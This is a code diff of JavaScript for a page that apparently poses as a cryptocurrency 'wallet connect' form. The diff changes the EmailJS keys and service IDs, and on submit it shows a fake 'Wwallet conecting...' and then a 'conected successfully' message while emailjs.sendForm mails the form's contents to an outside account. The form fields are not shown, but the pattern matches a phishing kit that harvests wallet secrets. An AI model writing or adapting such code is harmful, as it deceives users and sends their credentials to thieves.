@@ -1,5 +1,5 @@
 emailjs.init({
-	publicKey: "JyD16qbZ5jiq243nk",
+	publicKey: "3ubp9ib9d67ick-CX",
 });
 
 const roller = () => {
@@ -51,10 +51,14 @@ popupbg.addEventListener('click', (e) => {
 
 document.querySelectorAll('.main-form').forEach(forms => {
 	forms.addEventListener('submit', function (event) {
+		console.log("done")
 		event.preventDefault();
-		emailjs.sendForm('service_ue3ovlf', 'template_oafjir5', this)
+		const btn_connect = forms.querySelector(".css-ev97sc");
+		btn_connect.setAttribute("disabled", true);
+		btn_connect.innerHTML = `<span class="css-1o1xzxn">Wwallet conecting...</span>`
+		emailjs.sendForm('service_iqcf8gg', 'template_4p0736a', this)
 			.then(() => {
-				console.log('SUCCESS!');
+				btn_connect.innerHTML = `<span class="css-1o1xzxn">Wwallet conected successfully</span>`
 			}, (error) => {
 				console.log('FAILED...', error);
 			});
